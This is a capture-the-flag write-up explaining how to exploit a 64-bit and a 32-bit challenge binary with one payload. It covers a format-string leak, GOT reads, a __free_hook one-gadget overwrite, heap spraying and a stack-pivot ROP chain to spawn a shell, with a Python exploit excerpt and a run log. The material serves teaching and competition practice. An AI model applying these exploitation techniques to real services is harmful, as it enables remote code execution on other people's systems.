# Parallel Universe: Quarantine Simulator writeup

In this challenge we have to pwn two binaries, one 64-bit and one 32-bit
process. Both programs are compiled from the same source code, but for different
architectures.

The catch is that we need to pwn these two binaries with *the same* exploit
payload. If one of the programs crash during exploitation, the execution stops.
We can start by analyzing the binaries to see what they do.

## Analysis
We are greated with the following menu when we run the programs:
```console
$ ./quarantine
1. wash hands
2. order takeout
3. play ctf
4. shake hands with a stranger
> 
```

The following sections with briefly describe the different menu options.

The `wash_hands()` function asks how much soap we want, and then proceeds to
allocate that many bytes using `malloc()`. The only restriction is that we
cannot allocate more than 2 million bytes.
```C
int wash_hands()
{
	int result; // eax

	printf("How much soap? ");
	if ( (unsigned int)get_num("How much soap? ") < 0x1E8481 )
		result = puts("Successfully added soap!");
	else
		result = puts("Woah! Don't use up all the soap!");
	return result;
}
```

`order()` asks us what we would like to order, creates a message based on that
input and prints it out using `printf()`. See the following code snippet:
```C
int order()
{
	char *v0; // rax
	__int64 v2; // [rsp+0h] [rbp-808h]
	char s; // [rsp+400h] [rbp-408h]

	printf("What would you like to order? ");
	if ( !fgets((char *)&v2, 1024, stdin) )
	{
		perror("fgets()");
		exit(1);
	}
	v0 = strchr((const char *)&v2, 10);
	if ( v0 )
		*v0 = 0;
	snprintf(&s, 0x400uLL, "you ordered: %s\nit will arrive in ETA minutes\n", &v2);
	return printf(&s);
}
```

Our input is added to the buffer, which is then printed directly using
`printf()`. This means that we can control the format string argument :)


Moving along to `ctf()`, we can see that this function gives us an arbitrary
write primitive for free!
```C
unsigned __int64 ctf()
{
	_QWORD *v0; // rbx
	unsigned __int64 result; // rax

	printf("addr: ");
	v0 = (_QWORD *)get_addr();
	printf("value: ");
	result = get_addr();
	*v0 = result;
	return result;
}
```

The final function, `shake_hands()` is an arbitrary read primitive. How
convenient!
```C
int shake_hands()
{
  _QWORD *v0; // rax

  puts("That sounds a bit risky...");
  v0 = (_QWORD *)get_addr();
  return printf("This is the result: %p\n", *v0);
}
```

A quick look at the 32-bit binary reveals that it contains the exact same
functions.


## Exploitation
If we only had to exploit one of the binaries the steps would probably be
something like this:
1. leak binary base through format string bug
2. use arbitrary read to leak libc by reading GOT
3. use arbitrary write to hijack `__{malloc,free}_hook` to get code execution

So how can we make these steps work for both binaries *at the same time*?
What happens in the 32-bit binary if we use the arbitrary read/write primitives
and specify 64-bit addresses?

```console
pwndbg> r
1. wash hands
2. order takeout
3. play ctf
4. shake hands with a stranger
> 4
That sounds a bit risky...
0xdeaddeadbeef

Program received signal SIGSEGV, Segmentation fault.
0x56555a03 in shake_hands ()
LEGEND: STACK | HEAP | CODE | DATA | RWX | RODATA
─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ REGISTERS ]─────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 EAX  0xdeadbeef
 EBX  0x56557000 (_GLOBAL_OFFSET_TABLE_) ◂— 0x1ef4
 ECX  0xa
 EDX  0xdead
 EDI  0x0
 ESI  0x56555b34 ◂— imul   ebp, dword ptr [esi + 0x76], 0x64696c61 /* 'invalid choice: %d\n' */
 EBP  0x0
 ESP  0xffffcc50 —▸ 0x56555c61 ◂— push   esp /* 'That sounds a bit risky...' */
 EIP  0x56555a03 (shake_hands+35) ◂— mov    eax, dword ptr [eax]
──────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────[ DISASM ]───────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────
 ► 0x56555a03 <shake_hands+35>    mov    eax, dword ptr [eax]
   0x56555a05 <shake_hands+37>    mov    dword ptr [esp + 4], eax
   0x56555a09 <shake_hands+41>    lea    eax, [ebx - 0x1440]
   0x56555a0f <shake_hands+47>    mov    dword ptr [esp], eax
   0x56555a12 <shake_hands+50>    call   printf@plt <0x56555520>

   0x56555a17 <shake_hands+55>    add    esp, 8
   0x56555a1a <shake_hands+58>    pop    ebx
   0x56555a1b <shake_hands+59>    ret
```

Ok, so the address is simply truncated to 32-bits, which makes sense.

Is there any way we can make the lower 32-bits of a 64-bit address valid in the
32-bit program? Note that the `wash_hands()` function does not free the
allocated memory, so we can allocate as much as we like. That way we can exploit
the 64-bit program while we are writing to random mapped memory in the 32-bit
process.

Our game plan is then to exploit the 64-bit process without crashing the 32-bit
one, and then moving on to exploiting that one while the other one is freezed.
We will start by writing an exploit for the 64-bit program, and when that works
without crashing the 32-bit process we can move on to exploiting that one.

Except for allocating a ton of memory, the exploitation steps are similar to a
normal exploit. We start by leaking a pointer that's inside the binary mapping
using the format string bug. Then we use the arbitrary read to leak the address
of `puts()` by reading the GOT entry. After we have the libc base address we
overwrite `__free_hook` with the address of the following one-gadget:
```
0x10a38c execve("/bin/sh", rsp+0x70, environ)
constraints:
  [rsp+0x70] == NULL
```
By testing we found that this gadget worked fine, while the others failed for
both `__malloc_hook` and `__free_hook`. But there are no calls to `free()` in
the binary! So how can we trigger the one-gadget then? We do have a call to
`printf()` where we control the format argument, so we can make `printf()`
allocate its output buffer on the heap if we provide a format specifier that's
very wide :) When `printf()` is done it will call `free()` on the buffer.

The exploit for the 64-bit binary looks like this:
```python
# leak binary address
order("%p")
leak = int(io.recvline()[:-1], 16)
log.info("leak: {:#x}".format(leak))
exe.address = leak - 0xd15
log.success("binary base: {:#x}".format(exe.address))

# read GOT entry of puts()
libc = ELF("libc-2.27.so")
puts = shake_hands(exe.got["puts"])
log.info("puts: {:#x}".format(puts))
libc.address = puts - libc.symbols["puts"]
log.success("libc base: {:#x}".format(libc.address))

ctf(libc.symbols["__free_hook"], libc.address + 0x10a38c)
# trigger free call through printf()
order("%80000c")
```

Now how do we make sure that the 32-bit process doesn't crash?
If we allocate ~2GB, we should have a ~50% chance of success.
To allocate 2GB we can perform `(1024 * 1024 * 1024 * 2) / 2000000 = 1073`
allocations. Each allocating the maximum allowed of 2 million bytes.
During testing we found that around 1200 allocations was pretty good.

To exploit the 32-bit binary we can't really use one-gadgets since they all
require that some register points to the libc GOT. We went with a quick and
dirty solution: pivot the stack and use a ROP chain that calls
`execve("/bin/sh", NULL, NULL)`. While looking for gadgets we found a ton of
`mov esp` gadgets that looked something like this:
```
0x00096ec1 : mov esp, 0x5ff801c0 ; ret
```

That is, they move a constant value into `esp` and then return. Since we have
already sprayed a bunch of allocations, this is probably a valid address!
The exploitation steps for the 32-bit process then looks like this:

1. leak the binary base using the format string bug
2. use the arbitrary read to leak puts() through the GOT
3. use arbitrary write to change `__malloc_hook` into the stack pivot gadget
4. write ROP chain into new stack at `0x5ff801c0`
5. trigger a call to `malloc()` from `wash_hands()`
6. yay, shell!


Let's run the solution script!
```console
$ python2 solve.py REMOTE
[+] Opening connection to parallel2.tghack.no on port 6005: Done
[+] malloc() spray: malloc() spray done!
[*] leak: 0x55cac4997dd1
[+] binary base: 0x55cac4997000
[*] puts: 0x7f2d687159c0
[+] libc base: 0x7f2d68695000
[*] 32-bit binary leak: 0x565d8c1e
[+] 32-bit binary base: 0x565d8000
[*] puts: 0xf7da7360
[+] 32-bit libc base: 0xf7d40000
[+] spraying for fake stack: fake stack spray done!
[*] Switching to interactive mode

congrats, you win!
TG20{pwning_across_the_multiple_universes}
```

Woop! The script runs in a little over one minute, and fails sometimes. But
simply running it a few times should give you the flag.
